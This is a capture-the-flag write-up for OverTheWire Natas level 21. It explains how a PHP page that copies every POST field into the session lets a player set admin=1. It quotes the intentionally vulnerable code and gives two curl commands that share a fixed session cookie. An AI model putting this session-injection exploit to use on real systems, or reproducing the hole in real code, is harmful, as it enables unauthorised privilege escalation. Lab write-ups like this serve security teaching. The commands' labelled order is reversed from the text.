# This is a write-up for Natas - level 21

This level requires you to navigate two pages.

In essence, the main page doesn't allow you to modify session data, but if admin=1 in the $_SESSION array, it will print the credentials.
The other page allows you to modify session data, as we dive into here:

The following code sets up the form variable, which is essentially just html code for the page, and it also sets some default values for the three variables align, fontsize and bgcolor.

```php
<?
// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>

Now, the interesting code is this:

```php
<?
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
?>
```

Every key:value pair in the post request is stored in the session. This is briliant! We can send a post request to the experimenter page that sets admin to 1 and then go back to the main page and be done. 

The only issue is the session id. However, this can be set with the --cookie option in our curl requests. As long as they match up in the request to the experimenter and to the main page, it will work :D

<details>
    <summary>
        First curl request
    </summary>
curl -u natas21:<pwd> --cookie "PHPSESSID=adminsesh" http://natas21.natas.labs.overthewire.org/
</details>

<details>
    <summary>
        Second curl request
    </summary>
curl -u natas21:<pwd> -d "submit=Update&admin=1" --cookie "PHPSESSID=adminsesh" http://natas21-experimenter.natas.labs.overthewire.org/
</details>

